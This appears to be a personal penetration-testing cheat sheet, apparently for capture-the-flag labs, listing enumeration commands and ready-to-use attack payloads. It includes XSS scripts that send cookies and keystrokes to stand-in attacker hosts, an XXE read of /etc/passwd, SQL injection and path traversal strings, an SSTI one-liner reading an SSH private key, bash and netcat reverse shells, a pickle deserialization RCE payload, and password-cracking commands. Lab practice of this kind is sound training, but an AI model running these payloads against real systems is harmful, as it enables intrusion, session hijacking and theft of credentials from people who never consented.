https://fornex.com/my/vps/

####################### sources ###################
in kali > searchsploit                                                            # search exploit
https://www.exploit-db.com/                                                       # exploit DB
https://www.revshells.com/                                                        # shells generator
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  # shell cheat sheet
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  # interactive bash fully TTY
https://gtfobins.github.io/                                                       # bypass local security restrictions in Linux
https://github.com/payloadbox/command-injection-payload-list                      # Cheatsheet for command injection
http://www.xss-payloads.com/                                                      # Cheatsheet for XXS
http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html              # XXS keylogger
http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html                  # XXS portscanner
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection    # SSTi inj
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection 
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee           # SSTI in FLASK
https://wiki.owasp.org/index.php/OWASP_favicon_database                           # Databse of framework by favicon  OWASP DB
https://github.com/danielmiessler/SecLists                                        # Wordlists 
https://crackstation.net/                                                         # Hash craking
  
https://crt.sh                                                                    # Discover subdomains belonging to a domain by cert
https://transparencyreport.google.com/https/certificates                          # Discover subdomains belonging to a domain by cert
google: "-site:www.domain.com site:*.domain.com"                                  # Google dorks

https://requestbin.com/                                                           # For request 
https://xsshunter.com/                                                            # For blind XSS tool
https://vim.rtorr.com/                                                            # VIM cheat sheet


######################## Enumerate host ##############################################

nmap -sC -sV -A targetip -Pn                                                       # enumerate 
nmap -p- -T4 targetip -Pn                                                          # enumerate  other TCP ports
nmap -p 1-500 -sU -T4 targetip -Pn                                                 # enumerate  UDP ports
smbmap -H 10.10.11.152 -u "" -p ""                                                 # enumerate SMB
smbclient -L //10.10.11.152/ -N                                                    # enumerate SMB 
dnsrecon -t brt -d <site.name>                                                     # DNS Bruteforce enumeration domain
./sublist3r.py -d acmeitsupport.thm                                                # DNS enumeration domain
dig axfr <hostname> @<dns/hostip>                                                  # DNS zone transfer
ffuf -w /wordlist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.11.204     # Dir fuzzing subdomain
ffuf -w /wordlist.txt -u http://10.10.90.15/FUZZ                                   # Dir fuzzing  
dirb http://10.10.90.15/ /wordlist.txt                                             # Dir fuzzing  
gobuster dir --url http://10.10.90.15/ -w /wordlist.txt                            # Dir fuzzing
ffuf -w /wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <site> -mr "username already exists"
ffuf -w username.txt:W1,/wordlist.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <site> -fc 200

curl <hostname> -I                                                                 # Get response header
curl <hostname> -v                                                                 # Verbose mode with header
curl http://site.com/images/favico.ico | md5sum                                    # Get hash of the favicon site and when chek it on the OWASP DB (see 1 note)

#######################         XXE          #######################################

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>


<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>


#######################         XSS          #######################################

<script>alert('XSS');</script>                                                     # XSS Check
<script>fetch('https://hacker.serv/st?cookie=' + btoa(document.cookie));</script>  # Steal cookie
<script>document.onkeypress = function(e) {fetch('https://hacker.srv/log?key='+btoa(e.key));}</script> # Key loggin steal
<script>user.changeEmail('hacker@mail');</script>                                  # Use document script for xss
<script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>     # Send users cookie to your URL
<script>alert(window.location.hostname)</script>                                   # Show IP adress
<script>alert(document.cookie)</script>                                            # Show cookie
in console\ in <script>-tag: document.getElementById("elemid").textContent="value" # Change html page elemnt value

#### Polyglot XXS ####
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

########################### Path traversal #########################################

../../../../etc/passw                                                              # Path traversal for Linux
../../../../boot.ini                                                               # Path traversal for Win
../../../../windows/win.ini                                                        # Path traversal for Win

../../../../etc/passw%00                                                           # By adding the null-byte %00 or 0x00 we tell the  include function to ignore anything after the null byte
NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

../../../../etc/passwd/.                                                           # Be adding /. bypass filter
....//....//....//....//....//                                                     # Bypss filter by replace  

######################## Enumerate privileges #######################################
~~~~~~~~~~~~~~~~~~~~~~~~         win          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whoami /user                                                                       # check priv of the current user
whoami /priv                                                                       # check priv of the current user
net user <username>                                                                # check priv of the current user
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
winpeas.exe                                                                        # check current vector of piv

~~~~~~~~~~~~~~~~~~~~~~~~         lin          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo -l                                                                            # check aviable commands & permisions
linpeas.sh                                                                         # check aviable commands & permisions
pspy64                                                                             # check aviable commands & permisions

########################         SSTI          #####################################

{{ get_flashed_messages.__globals__.__builtins__.open(“/home/svc_acc/.ssh/id_rsa”).read() }} #As a one-liner

####################################################################################

nc -lvnp 9999                                                                      # strat simple nc server on 9999 port
python3 -m http.server 8000                                                        # strat simple python3 server on 8000 port

########################          RCE          #####################################

Linux command: whoami, ls, ping, sleep, nc                                         # Commands for test RCE
Windows commnad: whoami, dir, ping, timeout 
;nc -e /bin/bash                                                                   # Command inclusion reverse shell

########################          SQL          #####################################
~~~~~~~~~~~~~~~~~~~~~~       inband\error-based     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UNION SELECT 1,2,database()
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
FROM information_schema.tables WHERE table_schema = '' 
FROM information_schema.columns WHERE table_name = ''
0 UNION select 1,2, group_concat(username, ':', password SEPARATOR '<br>' ) FROM staff_users 
~~~~~~~~~~~~~~~~~~~~~~       blind\bypass-based     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
' OR 1=1;--
~~~~~~~~~~~~~~~~~~~~~~       blind\boolean-based    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
?username=admin123' UNION select 1,2,3 where database() like 'a%';--
?username=admin123' UNION select 1,2,3 from information_schema.tables where table_schema = 'sqli_three' and table_name like 'a%';--
?username=admin123' UNION select 1,2,3 from information_schema.columns where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'a%';--
?username=admin123' UNION  SELECT 1,2,3 from users where username like 'ad%' -- 
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
~~~~~~~~~~~~~~~~~~~~~~        blind\time-based      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

~~~~~~~~~~~~~~~~~~~~~~~~~~~        sqlite3     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlite3 <dbname.db\link>
.tables                                                                            # Tables list
pragma table_info(<table_name>);                                                   # Headers of the table


####################################################################################

curl -O http://10.10.14.33:8081/winPEASx64.exe <-UseBasicParsing>                  # Download file by curl
IWR http://10.10.14.10:9999/winPEASx64.exe -OutFile winPEASx64.exe                 # Download file in PowerShell


####################################################################################

fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt                # zip cracking
zip2john aaa.zip > hash; john hash -w=/usr/share/wordlists/rockyou.txt              # zip cracking
pfx2john aaa.pfx > hash; john hash -w=/usr/share/wordlists/rockyou.txt              # pfx cracking


######################### Certificate ##############################################

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes           # export priv.key from pfx
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem                # export cert from pfx

######################### WINRM ###################################################

evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S                   # winrm via cert + priv.key



python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
zip2john \ rar2john                                   # crack archives  via johntheripepr


bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"      # revers bash via "nc -lvnp 9001"


###make bash interactive###########################################################
python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
CTRL+Z
stty raw -echo
fg
export TERM=xterm

####################################################################################
script -qc /bin/bash /dev/null
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

####################################################################################
def rce():
  return os.system(request.args.get('cmd'))

#############################cookie injection pickle base64 ##########################################
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))


############################### Forensic ##########################################
pdfinfo <file.pdf>                                                                  # Get meta info from pdf files
exiftool <file.pdf>                                                                 # Get meta info from images files




